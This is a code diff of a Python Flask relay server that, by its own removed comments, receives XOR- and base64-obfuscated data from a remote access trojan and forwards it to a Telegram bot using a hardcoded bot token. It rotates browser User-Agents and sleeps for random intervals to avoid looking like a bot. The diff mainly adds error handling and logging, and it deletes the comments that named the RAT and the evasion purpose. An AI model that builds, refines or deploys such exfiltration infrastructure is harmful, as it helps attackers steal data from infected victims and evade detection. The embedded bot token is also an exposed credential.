@@ -6,14 +6,14 @@ import json
 import time
 import random
 import os
+import traceback
 
 app = Flask(__name__)
 CORS(app)
 
-# ТВОЙ ТОКЕН (ТОЛЬКО НА СЕРВЕРЕ)
+# ТВОЙ ТОКЕН
 TOKEN = "8244921168:AAF4I9ptSwQN1pUCp1f5oHFoUSUD3IyzU0Y"
 
-# Список легитимных User-Agent (чтобы не походить на бота)
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
@@ -23,24 +23,22 @@ USER_AGENTS = [
 @app.route('/api', methods=['POST'])
 def proxy():
     try:
-        # Получаем зашифрованные данные от RAT
         data = request.json
-        encrypted = data.get('data')
-        
-        if not encrypted:
+        if not data or 'data' not in data:
             return {"error": "No data"}, 400
         
-        # Расшифровываем (XOR + base64)
-        decoded = base64.b64decode(encrypted).decode()
-        decrypted = ''.join(chr(ord(c) ^ 0x3A) for c in decoded)
+        encrypted = data['data']
         
-        # Парсим JSON
-        payload = json.loads(decrypted)
+        # Расшифровка с обработкой ошибок
+        try:
+            decoded = base64.b64decode(encrypted).decode('utf-8', errors='ignore')
+            decrypted = ''.join(chr(ord(c) ^ 0x3A) for c in decoded)
+            payload = json.loads(decrypted)
+        except Exception as e:
+            return {"error": f"Decryption failed: {str(e)}"}, 400
         
-        # Выбираем случайный User-Agent
         headers = {'User-Agent': random.choice(USER_AGENTS)}
         
-        # Определяем тип запроса
         if payload.get('type') == 'message':
             url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
             tg_data = {
@@ -61,12 +59,14 @@ def proxy():
         else:
             return {"error": "Unknown type"}, 400
         
-        # Добавляем случайную задержку (чтобы не походить на бота)
         time.sleep(random.uniform(0.3, 1.0))
         
         return Response(resp.content, resp.status_code, mimetype='application/json')
         
     except Exception as e:
+        # Логируем ошибку
+        print(f"ERROR: {str(e)}")
+        print(traceback.format_exc())
         return {"error": str(e)}, 500
 
 @app.route('/health', methods=['GET'])
